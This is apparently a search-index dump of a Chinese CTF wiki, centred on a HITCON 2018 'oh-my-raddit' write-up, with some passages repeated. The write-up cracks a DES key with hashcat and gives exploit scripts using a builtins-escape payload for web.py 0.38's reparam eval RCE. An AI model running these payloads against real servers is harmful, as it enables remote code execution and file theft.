( limit ), get_urls ()) else : return web . template . frender ( 'templates/index.html' )( get_posts (), get_urls ()) if __name__ == \"__main__\" : app . run () \u5f97\u5230\u771f\u6b63\u7684\u79d8\u94a5:megnnaro oh-my-raddit2 \u00b6 \u76f8\u540c\u64cd\u4f5c\u4e0b\u8f7drequirements.txt\u53d1\u73b0 web.py==0.38 . \u8fd9\u4e2a\u7248\u672c\u7684web.py\u5b58\u5728\u4e00\u4e2aRCE: https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/ \u8fd9\u4e2a\u7248\u672c\u7684web.py\u5e94\u8be5\u662f\u4f5c\u8005\u63d0\u51fa\u6f0f\u6d1e\u540e\u7b2c\u4e00\u6b21\u7684\u4fee\u590d\u7ed3\u679c: import web web . reparam ( \"$__import__('os').getcwd()\" , {}) Traceback ( most recent call last ): File \"<input>\" , line 1 , in < module > File \"/Users/n3k0/PycharmProjects/webpy/venv/lib/python2.7/site-packages/web/db.py\" , line 305 , in reparam v = eval ( chunk , dictionary ) File \"<string>\" , line 1 , in < module > NameError : name '__import__' is not defined __import__ \u65e0\u6cd5\u4f7f\u7528,\u4f46\u4e0b\u9762\u7684payload\u53ef\u7528: import web web . reparam ( \"${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__):getthem['__import__']('os').system('ls'))()} \" , {}) test . py venv < sql : '0 ' > \u89c2\u5bdf\u5230 elif method == 'p': limit = s.get('l') return web.template.frender('templates/index.html')(get_posts(limit), get_urls()) else: return web.template.frender('templates/index.html')(get_posts(), get_urls()) \u4f7f\u7528\u4e86 get_posts() \u51fd\u6570\u3002 get_posts: def get_posts ( limit = None ): records = [] for i in db . select ( 'posts' , limit = limit , order = 'ups desc' ): tmp = { 'm' : 'r' , 't' : i . title . encode ( 'utf-8' , 'ignore' ), 'u' : i . id , } tmp [ 'param' ] = encrypt ( urllib . urlencode ( tmp )) tmp [ 'ups' ] = i . ups if i . file : tmp [ 'file' ] = encrypt ( urllib . urlencode ({ 'm' : 'd' , 'f' : i . file })) else : tmp [ 'file' ] = '' records . append ( tmp ) return records \u5728\u51fd\u6570get_posts()\u51fd\u6570\u4e2d\u4f7f\u7528\u4e86db.select(),\u8ffd\u6eaf\u5230\u5e95\u5c42\u6709reparam()\u51fd\u6570: def reparam ( string_ , dictionary ): \"\"\" Takes a string and a dictionary and interpolates the string using values from the dictionary. Returns an `SQLQuery` for the result. >>> reparam(\"s = $s\", dict(s=True)) <sql: \"s = 't'\"> >>> reparam(\"s IN $s\", dict(s=[1, 2])) <sql: 's IN (1, 2)'> \"\"\" dictionary = dictionary . copy () # eval mucks with it # disable builtins to avoid risk for remote code exection. dictionary [ '__builtins__' ] = object () vals = [] result = [] for live , chunk in _interpolate ( string_ ): if live : v = eval ( chunk , dictionary ) result . append ( sqlquote ( v )) else : result . append ( chunk ) return SQLQuery . join ( result , '' ) \u5176\u4e2d\u7684v = eval(chunk, dictionary)\u4fbf\u662f\u5229\u7528\u70b9\u3002 debug\u4e00\u4e0b\uff0c\u751f\u6210payload: from Crypto.Cipher import DES import requests def get_cipher ( plain ): key = 'ldgonaro' DES_fun = DES . new ( key , DES . MODE_ECB ) length = DES . block_size - len ( plain ) % DES . block_size plain += chr ( length ) * length cipher = DES_fun . encrypt ( plain ) . encode ( 'hex' ) return cipher url = 'http://127.0.0.1:8000/?s=' + get_cipher ( \"m=p&l=${test}\" ) print url http : // 127.0 . 0.1 : 8000 / ? s = 3 a3712cba592b47c5ca50b1fa63d1e82 \u5728reparam()\u5904\u4e0b\u65ad\u70b9\uff0cdebug: \u53ef\u4ee5\u770b\u5230\u4f20\u7ed9eval()\u7684\u53c2\u6570,\u4f46eval()\u53ef\u4ee5\u6267\u884c\u4f20\u5165\u7684\u547d\u4ee4\uff0c\u4f46\u5e76\u4e0d\u4f1a\u56de\u663e\uff0c\u53ef\u4ee5\u9009\u62e9\u5c06\u547d\u4ee4\u6267\u884c\u7684\u7ed3\u679c\u653e\u5165tmp\u76ee\u5f55\u4e0b\uff0c\u518d\u4e0b\u8f7d\u4e0b\u6765\u3002 exp.py: from Crypto.Cipher import DES import requests def get_cipher ( plain ): key = 'ldgonaro' DES_fun = DES . new ( key , DES . MODE_ECB ) length = DES . block_size - len ( plain ) % DES . block_size plain += chr ( length ) * length cipher = DES_fun . encrypt ( plain ) . encode ( 'hex' ) return cipher url1 = 'http://127.0.0.1:8000/?s=' + get_cipher ( \"m=p&l=${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__):getthem['__import__']('os').system('ls / > /tmp/data'))()}\" ) url2 = 'http://127.0.0.1:8000/?s=' + get_cipher ( \"m=d&f=/tmp/data\" ) r1 = requests . get ( url1 ) r2 = requests . get ( url2 ) print r2 . text","title":"oh-my-raddit | DES&Web.py_RCE"},{"location":"hitcon2018/web/oh-my-raddit/writeup/#oh-my-raddit1","text":"\u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0: < script type = \"text/javascript\" > function change ( t ){ var limit = t . value if ( limit == 10 ) { location . href = '?s=06e77f2958b65ffd3ca92540eb2d0a42' ; } else if ( limit == 100 ) { location . href = '?s=06e77f2958b65ffd2c0f7629b9e19627' ; } else { location . href = '/' ; } } < /script> \u63a8\u6d4bs\u662f\u7531\u67d0\u79cd\u52a0\u5bc6\u65b9\u5f0f\u5f97\u6765\uff0c\u800c 06e77f2958b65ffd3ca92540eb2d0a42 \u4e0e 06e77f2958b65ffd2c0f7629b9e19627 \u76f8\u6bd4\u8f83\uff0c\u524d\u534a\u90e8\u5206\u5b8c\u5168\u4e00\u81f4\uff0c\u63a8\u6d4b\u52a0\u5bc6\u5206\u7ec4\u4e3a8\u5b57\u8282\u3002 AES\u7b49\u52a0\u5bc6\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u4f7f\u75288\u5b57\u8282\u5206\u7ec4\uff0c\u4f46\u901a\u5e38\u662f16\u5b57\u8282\uff0c\u800cDES\u52a0\u5bc6\u53ea\u80fd\u4f7f\u75288\u5b57\u8282\u5206\u7ec4,\u731c\u6d4b\u4e3aDES\u52a0\u5bc6 \u6ce8\u610f\u5230\u540e\u7f00\u4e3a 3ca92540eb2d0a42 \u7684\u5b9e\u4f8b\u4e00\u5171\u670918\u5904\uff0c\u53ef\u4ee5\u80af\u5b9a\u52a0\u5bc6\u7684\u660e\u6587\u662f8\u7684\u500d\u6570\uff0c\u6240\u4ee5\u672b\u5c3e\u7edf\u4e00\u586b\u5145'\\x08'*8\uff0c\u800c\u4e14\u52a0\u5bc6\u6a21\u5f0f\u4e3aECB\u6a21\u5f0f\uff0cpadding\u89c4\u5219\u6709 pkcs5padding\u3001pkcs7padding\u3001zeropadding\u7b49 \u4f46DES\u901a\u5e38\u4f7f\u7528 pkcs5padding \u4e0d\u7528 zeropadding . \u6240\u4ee5\u73b0\u5728\u53ef\u77e5 \\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08 \u7684\u52a0\u5bc6\u7ed3\u679c\u4e3a '3ca92540eb2d0a42'.decode('hex') ,\u800c\u4e14\u79d8\u94a5\u5168\u662f\u5c0f\u5199\u5b57\u6bcd\u3002 \u4f7f\u7528hachcat\u8fdb\u884c\u7206\u7834: hashcat -m 14000 3ca92540eb2d0a42:0808080808080808 -a 3 '?l?l?l?l?l?l?l?l' --force \u5f97\u5230\u7ed3\u679c: 3ca92540eb2d0a42:0808080808080808:ldgonaro \u4f46\u79d8\u94a5\u5e76\u4e0d\u662f ldgonaro ,\u662f\u56e0\u4e3aDES\u5b58\u5728\u7b49\u4ef7\u79d8\u94a5: DES\u901a\u8fc7\u79cd\u5b50\u79d8\u94a5\u751f\u6210\u5b50\u79d8\u94a5\u65f6\uff0c\u5c0664\u4f4d\u7684\u79cd\u5b50\u79d8\u94a5\u76848\uff0c16\uff0c24\uff0c32\uff0c40\uff0c48\uff0c56\uff0c64\u4f4d\u4f5c\u4e3a\u5947\u5076\u6821\u9a8c\u4f4d\uff0c\u4e0d\u53c2\u4e0e\u5b50\u79d8\u94a5\u7684\u751f\u6210\u7b97\u6cd5\u3002 \u6240\u4ee5\u79d8\u94a5 bbbbbbbb \u7b49\u4ef7\u4e8e cccccccc \u56e0\u4e3a bin ( ord ( 'b' )) = 0b1100010 bin ( ord ( 'c' )) = 0b1100011 \u4f7f\u7528\u7b49\u4ef7\u79d8\u94a5 ldgonaro \u89e3\u5bc6\u6240\u6709\u5bc6\u6587: from Crypto.Cipher import DES def get_cipher (): import requests import re pattern = re . compile ( '<a href=\"\\?s=(\\w*)\">' ) url = 'http://127.0.0.1:8000/?s=06e77f2958b65ffd2c0f7629b9e19627' r = requests . get ( url ) data = r . text Cipher = pattern . findall ( data ) return Cipher key = 'ldgonaro' DES_fun = DES . new ( key , DES . MODE_ECB ) Cipher = get_cipher () plainData = [] for cipher in Cipher : plaintext = DES_fun . decrypt ( cipher . decode ( 'hex' )) plainData . append ( plaintext ) for plain in plainData : print plain \u5728\u7ed3\u679c\u4e2d\u53d1\u73b0\u4e00\u6761\u4e0e\u4f17\u4e0d\u540c\u7684\u660e\u6587: m=d&f=uploads%2F70c97cc1-079f-4d01-8798-f36925ec \u627e\u5230\u5176\u5bf9\u5e94\u7684\u5bc6\u6587\uff0c\u70b9\u8fd1\u5176\u6240\u5bf9\u5e94\u7684\u94fe\u63a5\u53d1\u73b0\u662f\u4e0b\u8f7d\u529f\u80fd\u3002 \u90a3\u4e48\u6784\u9020payload: m=d&f=app.py \u52a0\u5bc6\u540e\u8bbf\u95ee\u94fe\u63a5\u5f97\u5230app.py\u5185\u5bb9. exp.py: from Crypto.Cipher import DES import requests def get_cipher ( plain ): key = 'ldgonaro' DES_fun = DES . new ( key , DES . MODE_ECB ) length = DES . block_size - len ( plain ) % DES . block_size plain += chr ( length ) * length cipher = DES_fun . encrypt ( plain ) . encode ( 'hex' ) return cipher url = 'http://127.0.0.1:8000/?s=' + get_cipher ( 'm=d&f=app.py' ) r = requests . get ( url ) print r . text \u5f97\u5230app.py: # coding: UTF-8 import os import web import urllib import urlparse from Crypto.Cipher import DES web . config . debug = False ENCRPYTION_KEY = 'megnnaro' urls = ( '/' , 'index' ) app = web . application ( urls , globals ()) db = web . database ( dbn = 'sqlite' , db = 'db.db' ) def encrypt ( s ): length = DES . block_size - ( len ( s ) % DES . block_size ) s = s + chr ( length ) * length cipher = DES . new ( ENCRPYTION_KEY , DES . MODE_ECB ) return cipher . encrypt ( s ) . encode ( 'hex' ) def decrypt ( s ): try : data = s . decode ( 'hex' ) cipher = DES . new ( ENCRPYTION_KEY , DES . MODE_ECB ) data = cipher . decrypt ( data ) data = data [: - ord ( data [ - 1 ])] return dict ( urlparse . parse_qsl ( data )) except Exception as e : print e . message return {} def get_posts ( limit = None ): records = [] for i in db . select ( 'posts' , limit = limit , order = 'ups desc' ): tmp = { 'm' : 'r' , 't' : i . title . encode ( 'utf-8' , 'ignore' ), 'u' : i . id , } tmp [ 'param' ] = encrypt ( urllib . urlencode ( tmp )) tmp [ 'ups' ] = i . ups if i . file : tmp [ 'file' ] = encrypt ( urllib . urlencode ({ 'm' : 'd' , 'f' : i . file })) else : tmp [ 'file' ] = '' records . append ( tmp ) return records def get_urls (): urls = [] for i in [ 10 , 100 , 1000 ]: data = { 'm' : 'p' , 'l' : i } urls . append ( encrypt ( urllib . urlencode ( data )) ) return urls class index : def GET ( self ): s = web . input () . get ( 's' ) if not s : return web . template . frender ( 'templates/index.html' )( get_posts (), get_urls ()) else : s = decrypt ( s ) method = s . get ( 'm' , '' ) if method and method not in list ( 'rdp' ): return 'param error' if method == 'r' : uid = s . get ( 'u' ) record = db . select ( 'posts' , where = 'id=$id' , vars = { 'id' : uid }) . first () if record : raise web . seeother ( record . url ) else : return 'not found' elif method == 'd' : file = s . get ( 'f' ) if not os . path . exists ( file ): return 'not found' name = os . path . basename ( file ) web . header ( 'Content-Disposition' , 'attachment; filename= %s ' % name ) web . header ( 'Content-Type' , 'application/pdf' ) with open ( file , 'rb' ) as fp : data = fp . read () return data elif method == 'p' : limit = s . get ( 'l' ) return web . template . frender ( 'templates/index.html' )( get_posts ( limit ), get_urls ()) else : return web . template . frender ( 'templates/index.html' )( get_posts (), get_urls ()) if __name__ == \"__main__\" : app . run () \u5f97\u5230\u771f\u6b63\u7684\u79d8\u94a5:megnnaro","title":"oh-my-raddit1"},{"location":"hitcon2018/web/oh-my-raddit/writeup/#oh-my-raddit2","text":"\u76f8\u540c\u64cd\u4f5c\u4e0b\u8f7drequirements.txt\u53d1\u73b0 web.py==0.38 . \u8fd9\u4e2a\u7248\u672c\u7684web.py\u5b58\u5728\u4e00\u4e2aRCE: https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/ \u8fd9\u4e2a\u7248\u672c\u7684web.py\u5e94\u8be5\u662f\u4f5c\u8005\u63d0\u51fa\u6f0f\u6d1e\u540e\u7b2c\u4e00\u6b21\u7684\u4fee\u590d\u7ed3\u679c: import web web . reparam ( \"$__import__('os').getcwd()\" , {}) Traceback ( most recent call last ): File \"<input>\" , line 1 , in < module > File \"/Users/n3k0/PycharmProjects/webpy/venv/lib/python2.7/site-packages/web/db.py\" , line 305 , in reparam v = eval ( chunk , dictionary ) File \"<string>\" , line 1 , in < module > NameError : name '__import__' is not defined __import__ \u65e0\u6cd5\u4f7f\u7528,\u4f46\u4e0b\u9762\u7684payload\u53ef\u7528: import web web . reparam ( \"${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__):getthem['__import__']('os').system('ls'))()} \" , {}) test . py venv < sql : '0 ' > \u89c2\u5bdf\u5230 elif method == 'p': limit = s.get('l') return web.template.frender('templates/index.html')(get_posts(limit), get_urls()) else: return web.template.frender('templates/index.html')(get_posts(), get_urls()) \u4f7f\u7528\u4e86 get_posts() \u51fd\u6570\u3002 get_posts: def get_posts ( limit = None ): records = [] for i in db . select ( 'posts' , limit = limit , order = 'ups desc' ): tmp = { 'm' : 'r' , 't' : i . title . encode ( 'utf-8' , 'ignore' ), 'u' : i . id , } tmp [ 'param' ] = encrypt ( urllib . urlencode ( tmp )) tmp [ 'ups' ] = i . ups if i . file : tmp [ 'file' ] = encrypt ( urllib . urlencode ({ 'm' : 'd' , 'f' : i . file })) else : tmp [ 'file' ] = '' records . append ( tmp ) return records \u5728\u51fd\u6570get_posts()\u51fd\u6570\u4e2d\u4f7f\u7528\u4e86db.select(),\u8ffd\u6eaf\u5230\u5e95\u5c42\u6709reparam()\u51fd\u6570: def reparam ( string_ , dictionary ): \"\"\" Takes a string and a dictionary and interpolates the string using values from the dictionary. Returns an `SQLQuery` for the result. >>> reparam(\"s = $s\", dict(s=True)) <sql: \"s = 't'\"> >>> reparam(\"s IN $s\", dict(s=[1, 2])) <sql: 's IN (1, 2)'> \"\"\" dictionary = dictionary . copy () # eval mucks with it # disable builtins to avoid risk for remote code exection. dictionary [ '__builtins__' ] = object () vals = [] result = [] for live , chunk in _interpolate ( string_ ): if live : v = eval ( chunk , dictionary ) result . append ( sqlquote ( v )) else : result . append ( chunk ) return SQLQuery . join ( result , '' ) \u5176\u4e2d\u7684v = eval(chunk, dictionary)\u4fbf\u662f\u5229\u7528\u70b9\u3002 debug\u4e00\u4e0b\uff0c\u751f\u6210payload: from Crypto.Cipher import DES import requests def get_cipher ( plain ): key = 'ldgonaro' DES_fun = DES . new ( key , DES . MODE_ECB ) length = DES . block_size - len ( plain ) % DES . block_size plain += chr ( length ) * length cipher = DES_fun . encrypt ( plain ) . encode ( 'hex' ) return cipher url = 'http://127.0.0.1:8000/?s=' + get_cipher ( \"m=p&l=${test}\" ) print url http : // 127.0 . 0.1 : 8000 / ? s = 3 a3712cba592b47c5ca50b1fa63d1e82 \u5728reparam()\u5904\u4e0b\u65ad\u70b9\uff0cdebug: \u53ef\u4ee5\u770b\u5230\u4f20\u7ed9eval()\u7684\u53c2\u6570,\u4f46eval()\u53ef\u4ee5\u6267\u884c\u4f20\u5165\u7684\u547d\u4ee4\uff0c\u4f46\u5e76\u4e0d\u4f1a\u56de\u663e\uff0c\u53ef\u4ee5\u9009\u62e9\u5c06\u547d\u4ee4\u6267\u884c\u7684\u7ed3\u679c\u653e\u5165tmp\u76ee\u5f55\u4e0b\uff0c\u518d\u4e0b\u8f7d\u4e0b\u6765\u3002 exp.py: from Crypto.Cipher import DES import requests def get_cipher ( plain ): key = 'ldgonaro' DES_fun = DES . new ( key , DES . MODE_ECB ) length = DES . block_size - len ( plain ) % DES . block_size plain += chr ( length ) * length cipher = DES_fun . encrypt ( plain ) . encode ( 'hex' ) return cipher url1 = 'http://127.0.0.1:8000/?s=' + get_cipher ( \"m=p&l=${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__):getthem['__import__']('os').system('ls / > /tmp/data'))()}\" ) url2 = 'http://127.0.0.1:8000/?s=' + get_cipher ( \"m=d&f=/tmp/data\" ) r1 = requests . get ( url1 ) r2 = requests . get ( url2 ) print r2 . text","title":"oh-my-raddit2"},{"location":"introduction/cgc/","text":"\u672c\u8282\u5185\u5bb9\u6458\u81ea\u674e\u5eb7\u6559\u6388\u4e8e 2016 \u5e74 8 \u6708 17 \u65e5 ISC \u4e92\u8054\u7f51\u5b89\u5168\u5927\u4f1a\u6f14\u8bb2\u300a\u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u4e2d\u7684\u6f0f\u6d1e\u53d1\u6398\u4e0e\u5229\u7528\u300b\u3002 CGC \u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u662f\u5168\u7403\u9996\u6b21\u673a\u5668\u7f51\u7edc\u653b\u9632\u6bd4\u8d5b\uff0c\u6bd4\u8d5b\u8fc7\u7a0b\u5168\u81ea\u52a8\uff0c\u65e0\u4efb\u4f55\u4eba\u5de5\u5e72\u9884\u3002\u8003\u9a8c\u673a\u5668\u81ea\u52a8\u6f0f\u6d1e\u6316\u6398\u3001\u81ea\u52a8\u8f6f\u4ef6\u52a0\u56fa\u3001\u81ea\u52a8\u6f0f\u5229\u7528\u548c\u81ea\u52a8\u7f51\u7edc\u9632\u62a4\u6c34\u5e73\u3002\u4f7f\u7528\u7b80\u5316\u7684 Linux \u64cd\u4f5c\u7cfb\u7edf------DECREE\uff0c\u7c7b\u4f3c Snort \u7684\u89c4\u5219\u8fc7\u6ee4\u9632\u706b\u5899\u3002\u5bf9 Linux \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\u3002\u6240\u6709\u53c2\u8d5b\u961f\u90fd\u6ca1\u6709\u7a0b\u5e8f\u6e90\u7801\u3002 \u5728 2016 \u5e74\u7684 CGC \u6bd4\u8d5b\u4e2d\uff0c\u6311\u6218\u7684\u8d5b\u9898\u5305\u542b\u4e86 53 \u79cd CWE\u3002\u5176\u4e2d\u5305\u542b 28 \u4e2a\u5806\u6ea2\u51fa\u6f0f\u6d1e\u300124 \u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u300116 \u4e2a\u7a7a\u6307\u9488\u8bbf\u95ee\u6f0f\u6d1e\u300113 \u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u548c 8 \u4e2a UAF \u6f0f\u6d1e\u3002 \u653b\u9632\u8fc7\u7a0b\u7531\u7ec4\u7ec7\u65b9\u53d1\u51fa\u6311\u6218\u7a0b\u5e8f\uff0c\u5404\u56e2\u961f\u670d\u52a1\u5668\u53ef\u4ee5\u5411\u7ec4\u7ec7\u65b9\u63d0\u4f9b\u8865\u4e01\u7a0b\u5e8f\uff0c\u9632\u706b\u5899\u89c4\u5219\u548c\u653b\u51fb\u7a0b\u5e8f\u3002\u4fee\u8865\u8fc7\u7684\u7a0b\u5e8f\u548c\u9632\u706b\u5899\u89c4\u5219\u4f1a\u5206\u53d1\u7ed9\u5176\u4ed6\u56e2\u961f\u3002\u7ec4\u7ec7\u65b9\u4e3a\u6bcf\u4e2a\u56e2\u961f\u8fd0\u884c\u6311\u6218\u7a0b\u5e8f\uff0c\u8fdb\u884c\u670d\u52a1\u6d4b\u8bd5\u548c\u653b\u51fb\u5e76\u8fdb\u884c\u8bc4\u4f30\u3002 \u6027\u80fd\u8bc4\u4ef7\u6307\u6807 \u00b6 \u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b \u6253\u8865\u4e01\u9891\u7387\uff1b \u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b \u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b \u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002 \u660e\u786e\u6838\u5fc3\u4efb\u52a1 \u00b6 \u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002 \u5206\u6790\u65b9\u6cd5 \u00b6 \u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b \u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b \u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002 CGC \u7ecf\u9a8c\u603b\u7ed3 \u00b6 \u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b \u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b \u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b \u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u7814\u7a76\u503c\u5f97\u671f\u5f85\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002","title":"Cgc"},{"location":"introduction/cgc/#_1","text":"\u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b \u6253\u8865\u4e01\u9891\u7387\uff1b \u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b \u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b \u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002","title":"\u6027\u80fd\u8bc4\u4ef7\u6307\u6807"},{"location":"introduction/cgc/#_2","text":"\u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002","title":"\u660e\u786e\u6838\u5fc3\u4efb\u52a1"},{"location":"introduction/cgc/#_3","text":"\u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b \u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b \u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002","title":"\u5206\u6790\u65b9\u6cd5"},{"location":"introduction/cgc/#cgc","text":"\u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b \u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b \u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b \u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u7814\u7a76\u503c\u5f97\u671f\u5f85\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002","title":"CGC \u7ecf\u9a8c\u603b\u7ed3"},{"location":"introduction/content/","text":"\u56e0\u4e3a CTF \u7684\u8003\u9898\u8303\u56f4\u5176\u5b9e\u6bd4\u8f83\u5bbd\u5e7f\uff0c\u76ee\u524d\u4e5f\u6ca1\u6709\u592a\u660e\u786e\u7684\u89c4\u5b9a\u754c\u9650\u8bf4\u4f1a\u8003\u54ea\u4e9b\u5185\u5bb9\u3002\u4f46\u662f\u5c31\u76ee\u524d\u7684\u6bd4\u8d5b\u9898\u578b\u800c\u8a00\u7684\u8bdd\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u636e\u5e38\u89c1\u7684 Web \u7f51\u7edc\u653b\u9632\u3001RE \u9006\u5411\u5de5\u7a0b\u3001Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\u3001Crypto \u5bc6\u7801\u653b\u51fb\u3001Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u6765\u8fdb\u884c\u5206\u7c7b\u3002 Web - \u7f51\u7edc\u653b\u9632 \u4e3b\u8981\u4ecb\u7ecd\u4e86 Web \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u6f0f\u6d1e\uff0c\u5982 SQL \u6ce8\u5165\u3001XSS\u3001CSRF\u3001\u6587\u4ef6\u5305\u542b\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u4ee3\u7801\u5ba1\u8ba1\u3001PHP \u5f31\u7c7b\u578b\u7b49\uff0cWeb \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u9898\u578b\u53ca\u89e3\u9898\u601d\u8def\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u5de5\u5177\u3002 Reverse Engineering - \u9006\u5411\u5de5\u7a0b \u4e3b\u8981\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u7684\u5e38\u89c1\u9898\u578b\u3001\u5de5\u5177\u5e73\u53f0\u3001\u89e3\u9898\u601d\u8def\uff0c\u8fdb\u9636\u90e8\u5206\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u5e38\u89c1\u7684\u8f6f\u4ef6\u4fdd\u62a4\u3001\u53cd\u7f16\u8bd1\u3001\u53cd\u8c03\u8bd5\u3001\u52a0\u58f3\u8131\u58f3\u6280\u672f\u3002 Pwn - \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 Pwn \u9898\u76ee\u4e3b\u8981\u8003\u5bdf\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u7684\u53d1\u6398\u548c\u5229\u7528\uff0c\u9700\u8981\u5bf9\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u5e95\u5c42\u6709\u4e00\u5b9a\u7684\u4e86\u89e3\u3002\u5728 CTF \u7ade\u8d5b\u4e2d\uff0cPWN \u9898\u76ee\u4e3b\u8981\u51fa\u73b0\u5728 Linux \u5e73\u53f0\u4e0a\u3002 Crypto - \u5bc6\u7801\u653b\u51fb 